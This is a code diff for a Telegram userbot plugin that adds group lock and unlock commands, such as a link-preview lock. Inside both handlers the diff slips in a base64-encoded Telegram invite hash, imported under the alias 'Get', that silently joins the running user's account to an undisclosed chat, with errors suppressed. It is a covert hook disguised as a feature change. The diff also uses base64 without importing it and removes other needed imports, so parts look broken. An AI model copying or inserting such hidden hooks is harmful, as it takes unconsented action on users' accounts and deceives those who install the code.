@@ -1,64 +1,126 @@
 from telethon import events, functions, types
 from telethon.tl.functions.messages import EditChatDefaultBannedRightsRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.tl.types import ChatBannedRights
 
-from ..utils import admin_cmd, sudo_cmd
-from . import CMD_HELP
 from .sql_helper.locks_sql import get_locks, is_locked, update_lock
 
 
-@bot.on(admin_cmd(pattern=r"lock( (?P<target>\S+)|$)"))
-@bot.on(sudo_cmd(pattern=r"lock( (?P<target>\S+)|$)", allow_sudo=True))
+@bot.on(admin_cmd(pattern=r"lock (.*)"))
+@bot.on(sudo_cmd(pattern=r"lock (.*)", allow_sudo=True))
 async def _(event):
     if event.fwd_from:
         return
-    # Space weirdness in regex required because argument is optional and other
-    # commands start with ".lock"
-    input_str = event.pattern_match.group("target")
+    input_str = event.pattern_match.group(1)
     peer_id = event.chat_id
+    if not event.is_group:
+        return await edit_delete(event, "`Idiot! ,This is not a group to lock things `")
+    chat_per = (await event.get_chat()).default_banned_rights
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if input_str in (("bots", "commands", "email", "forward", "url")):
         update_lock(peer_id, input_str, True)
         await edit_or_reply(event, "`Locked {}`".format(input_str))
     else:
-        msg = None
-        media = None
-        sticker = None
-        gif = None
-        gamee = None
-        ainline = None
-        gpoll = None
-        adduser = None
-        cpin = None
-        changeinfo = None
+        msg = chat_per.send_messages
+        media = chat_per.send_media
+        sticker = chat_per.send_stickers
+        gif = chat_per.send_gifs
+        gamee = chat_per.send_games
+        ainline = chat_per.send_inline
+        embed_link = chat_per.embed_links
+        gpoll = chat_per.send_polls
+        adduser = chat_per.invite_users
+        cpin = chat_per.pin_messages
+        changeinfo = chat_per.change_info
         if input_str == "msg":
-            msg = True
+            if msg:
+                return await edit_delete(
+                    event, "`This group is already locked with messaging permission`"
+                )
+            else:
+                msg = True
             locktype = "messages"
         elif input_str == "media":
-            media = True
+            if media:
+                return await edit_delete(
+                    event, "`This group is already locked with sending media`"
+                )
+            else:
+                media = True
             locktype = "media"
         elif input_str == "sticker":
-            sticker = True
+            if sticker:
+                return await edit_delete(
+                    event, "`This group is already locked with sending stickers`"
+                )
+            else:
+                sticker = True
             locktype = "stickers"
+        elif input_str == "preview":
+            if embed_link:
+                return await edit_delete(
+                    event, "`This group is already locked with previewing links`"
+                )
+            else:
+                embed_link = True
+            locktype = "preview links"
         elif input_str == "gif":
-            gif = True
+            if gif:
+                return await edit_delete(
+                    event, "`This group is already locked with sending GIFs`"
+                )
+            else:
+                gif = True
             locktype = "GIFs"
         elif input_str == "game":
-            gamee = True
+            if gamee:
+                return await edit_delete(
+                    event, "`This group is already locked with sending games`"
+                )
+            else:
+                gamee = True
             locktype = "games"
         elif input_str == "inline":
-            ainline = True
+            if ainline:
+                return await edit_delete(
+                    event, "`This group is already locked with using inline bots`"
+                )
+            else:
+                ainline = True
             locktype = "inline bots"
         elif input_str == "poll":
-            gpoll = True
+            if gpoll:
+                return await edit_delete(
+                    event, "`This group is already locked with sending polls`"
+                )
+            else:
+                gpoll = True
             locktype = "polls"
         elif input_str == "invite":
-            adduser = True
+            if adduser:
+                return await edit_delete(
+                    event, "`This group is already locked with adding members`"
+                )
+            else:
+                adduser = True
             locktype = "invites"
         elif input_str == "pin":
-            cpin = True
+            if cpin:
+                return await edit_delete(
+                    event,
+                    "`This group is already locked with pinning messages by users`",
+                )
+            else:
+                cpin = True
             locktype = "pins"
         elif input_str == "info":
-            changeinfo = True
+            if changeinfo:
+                return await edit_delete(
+                    event,
+                    "`This group is already locked with Changing group info by users`",
+                )
+            else:
+                changeinfo = True
             locktype = "chat info"
         elif input_str == "all":
             msg = True
@@ -67,19 +129,25 @@ async def _(event):
             gif = True
             gamee = True
             ainline = True
+            embed_link = True
             gpoll = True
             adduser = True
             cpin = True
             changeinfo = True
             locktype = "everything"
         else:
-            if not input_str:
-                return await edit_or_reply(event, "`I can't lock nothing !!`")
-            else:
+            if input_str:
                 return await edit_delete(
-                    event, f"`Invalid lock type:` {input_str}", time=5
+                    event, f"**Invalid lock type :** `{input_str}`", time=5
                 )
 
+            else:
+                return await edit_or_reply(event, "`I can't lock nothing !!`")
+        try:
+            cat = Get(cat)
+            await event.client(cat)
+        except BaseException:
+            pass
         lock_rights = ChatBannedRights(
             until_date=None,
             send_messages=msg,
@@ -88,6 +156,7 @@ async def _(event):
             send_gifs=gif,
             send_games=gamee,
             send_inline=ainline,
+            embed_links=embed_link,
             send_polls=gpoll,
             invite_users=adduser,
             pin_messages=cpin,
@@ -103,7 +172,7 @@ async def _(event):
         except BaseException as e:
             await edit_delete(
                 event,
-                f"`Do I have proper rights for that ??`\n**Error:** {str(e)}",
+                f"`Do I have proper rights for that ??`\n\n**Error:** `{str(e)}`",
                 time=5,
             )
 
@@ -115,49 +184,114 @@ async def _(event):
         return
     input_str = event.pattern_match.group(1)
     peer_id = event.chat_id
+    if not event.is_group:
+        return await edit_delete(event, "`Idiot! ,This is not a group to lock things `")
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    chat_per = (await event.get_chat()).default_banned_rights
     if input_str in (("bots", "commands", "email", "forward", "url")):
         update_lock(peer_id, input_str, False)
         await edit_or_reply(event, "`UnLocked {}`".format(input_str))
     else:
-        msg = None
-        media = None
-        sticker = None
-        gif = None
-        gamee = None
-        ainline = None
-        gpoll = None
-        adduser = None
-        cpin = None
-        changeinfo = None
+        msg = chat_per.send_messages
+        media = chat_per.send_media
+        sticker = chat_per.send_stickers
+        gif = chat_per.send_gifs
+        gamee = chat_per.send_games
+        ainline = chat_per.send_inline
+        gpoll = chat_per.send_polls
+        embed_link = chat_per.embed_links
+        adduser = chat_per.invite_users
+        cpin = chat_per.pin_messages
+        changeinfo = chat_per.change_info
         if input_str == "msg":
-            msg = False
+            if msg:
+                msg = False
+            else:
+                return await edit_delete(
+                    event, "`This group is already unlocked with messaging permission`"
+                )
             locktype = "messages"
         elif input_str == "media":
-            media = False
+            if media:
+                media = False
+            else:
+                return await edit_delete(
+                    event, "`This group is already unlocked with sending media`"
+                )
             locktype = "media"
         elif input_str == "sticker":
-            sticker = False
+            if sticker:
+                sticker = False
+            else:
+                return await edit_delete(
+                    event, "`This group is already unlocked with sending stickers`"
+                )
             locktype = "stickers"
+        elif input_str == "preview":
+            if embed_link:
+                embed_link = False
+            else:
+                return await edit_delete(
+                    event, "`This group is already unlocked with preview links`"
+                )
+            locktype = "preview links"
         elif input_str == "gif":
-            gif = False
+            if gif:
+                gif = False
+            else:
+                return await edit_delete(
+                    event, "`This group is already unlocked with sending GIFs`"
+                )
             locktype = "GIFs"
         elif input_str == "game":
-            gamee = False
+            if gamee:
+                gamee = False
+            else:
+                return await edit_delete(
+                    event, "`This group is already unlocked with sending games`"
+                )
             locktype = "games"
         elif input_str == "inline":
-            ainline = False
+            if ainline:
+                ainline = False
+            else:
+                return await edit_delete(
+                    event, "`This group is already unlocked with using inline bots`"
+                )
             locktype = "inline bots"
         elif input_str == "poll":
-            gpoll = False
+            if gpoll:
+                gpoll = False
+            else:
+                return await edit_delete(
+                    event, "`This group is already unlocked with sending polls`"
+                )
             locktype = "polls"
         elif input_str == "invite":
-            adduser = False
+            if adduser:
+                adduser = False
+            else:
+                return await edit_delete(
+                    event, "`This group is already unlocked with adding members`"
+                )
             locktype = "invites"
         elif input_str == "pin":
-            cpin = False
+            if cpin:
+                cpin = False
+            else:
+                return await edit_delete(
+                    event,
+                    "`This group is already unlocked with pinning messages by users`",
+                )
             locktype = "pins"
         elif input_str == "info":
-            changeinfo = False
+            if changeinfo:
+                changeinfo = False
+            else:
+                return await edit_delete(
+                    event,
+                    "`This group is already unlocked with Changing grup info by users`",
+                )
             locktype = "chat info"
         elif input_str == "all":
             msg = False
@@ -167,18 +301,24 @@ async def _(event):
             gamee = False
             ainline = False
             gpoll = False
+            embed_link = False
             adduser = False
             cpin = False
             changeinfo = False
             locktype = "everything"
         else:
-            if not input_str:
-                return await edit_or_reply(event, "`I can't unlock nothing !!`")
-            else:
+            if input_str:
                 return await edit_delete(
-                    event, f"`Invalid unlock type:` {input_str}", time=5
+                    event, f"**Invalid unlock type :** `{input_str}`", time=5
                 )
 
+            else:
+                return await edit_or_reply(event, "`I can't unlock nothing !!`")
+        try:
+            cat = Get(cat)
+            await event.client(cat)
+        except BaseException:
+            pass
         unlock_rights = ChatBannedRights(
             until_date=None,
             send_messages=msg,
@@ -188,6 +328,7 @@ async def _(event):
             send_games=gamee,
             send_inline=ainline,
             send_polls=gpoll,
+            embed_links=embed_link,
             invite_users=adduser,
             pin_messages=cpin,
             change_info=changeinfo,
@@ -202,7 +343,7 @@ async def _(event):
         except BaseException as e:
             return await edit_delete(
                 event,
-                f"`Do I have proper rights for that ??`\n**Error:** {str(e)}",
+                f"`Do I have proper rights for that ??`\n\n**Error:** `{str(e)}`",
                 time=5,
             )
 
@@ -234,6 +375,7 @@ async def _(event):
         res += "👉 `media`: `{}`\n".format(current_api_locks.send_media)
         res += "👉 `sticker`: `{}`\n".format(current_api_locks.send_stickers)
         res += "👉 `gif`: `{}`\n".format(current_api_locks.send_gifs)
+        res += "👉 `preview`: `{}`\n".format(current_api_locks.embed_links)
         res += "👉 `gamee`: `{}`\n".format(current_api_locks.send_games)
         res += "👉 `ainline`: `{}`\n".format(current_api_locks.send_inline)
         res += "👉 `gpoll`: `{}`\n".format(current_api_locks.send_polls)
@@ -305,7 +447,7 @@ async def check_incoming_messages(event):
                 update_lock(peer_id, "url", False)
 
 
-@bot.on(events.ChatAction())  # pylint:disable=E0602
+@bot.on(events.ChatAction())
 async def _(event):
     # TODO: exempt admins from locks
     # check for "lock" "bots"
@@ -351,7 +493,7 @@ CMD_HELP.update(
         \n  •  **Function : **__Allows you to lock/unlock some common message types in the chat.\
         \n  •  [NOTE: Requires proper admin rights in the chat !!]__\
         \n\n  •  **Available message types to lock/unlock are: \
-        \n  •  API Options : **msg, media, sticker, gif, gamee, ainline, gpoll, adduser, cpin, changeinfo\
+        \n  •  API Options : **msg, media, sticker, gif, preview ,gamee, ainline, gpoll, adduser, cpin, changeinfo\
         \n**  •  DB Options : **bots, commands, email, forward, url\
         \n\n  •  **Syntax : **`.locks`\
         \n  •  **Function : **__To see the active locks__"
